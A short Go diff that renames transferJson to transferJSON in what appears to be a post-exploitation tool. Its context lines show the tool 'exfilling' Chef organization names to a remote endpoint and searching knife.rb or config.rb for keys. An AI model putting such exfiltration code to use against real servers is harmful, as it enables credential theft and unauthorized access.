@@ -280,7 +280,7 @@ func newFileUploadRequest(uri string, params map[string]string, paramName, path 
 	return req, err
 }
 
-func transferJson(jBytes []byte, endpoint string) {
+func transferJSON(jBytes []byte, endpoint string) {
 	proto := "http://"
 	if serveSSL {
 		proto = "https://"
@@ -464,7 +464,7 @@ func chefServer(chefServerFile string, chefFiles []string) {
 	}
 	jBytes, _ := json.Marshal(Org{Name: organizations})
 	msg("Exfilling organization name %v...", organizations)
-	transferJson(jBytes, "org")
+	transferJSON(jBytes, "org")
 	config := locateConfig(chefFiles)
 	// If a config.rb or knife.rb exists, use it to locate the keys
 	if config != "" {
